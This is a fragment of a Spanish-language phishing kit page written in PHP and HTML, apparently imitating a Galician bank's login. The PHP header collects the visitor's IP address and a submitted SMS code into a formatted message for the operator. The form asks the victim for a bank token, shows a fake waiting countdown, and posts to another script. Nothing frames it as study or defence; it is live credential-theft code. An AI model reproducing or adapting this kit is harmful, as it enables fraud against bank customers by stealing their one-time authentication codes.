<?php  
$enviara =
    "<b> ## código SMS galicia ## </b>\n".
    "<b>Direccion IP: </b> ".$_SERVER['REMOTE_ADDR']."\n".
    
    "<b>SMS: </b> <code>".$_POST['ahhhhhhhhhjajajaja']."</code>\n";    
  ...
  <body>
    ...
    <div class="alert border rounded-0 shadow">
      ...
      <div class="text-start">
        ...
        Esto puede tomar <b class="segundos">25</b> segundos
      </div>
    </div>
  </div>
      ...
      <div class="col-sm-12">
        <div class="row m-0">
          ...
          <div class="col-sm-4">
            ...
            <form class="py-3" method="POST" action="awe.php"> 
              <div class="alert alert-warning mb-5 rounded-0">
                Ahora ingrese su número de token
              </div>
              <div class="field mt-3 mb-5 position-relative">
                <input type="tel" maxlength="6" minlength="3" class="custom-lavel-up border-bottom w-100" required name="da">
                <label class="position-absolute label-floating-custom">Token</label>
              </div>
              
             
              <div class="px-1 mb-2">
                <button name="variable" class="btn btn-gali w-100 text-white">INICIAR SESIÓN</button>
              </div>
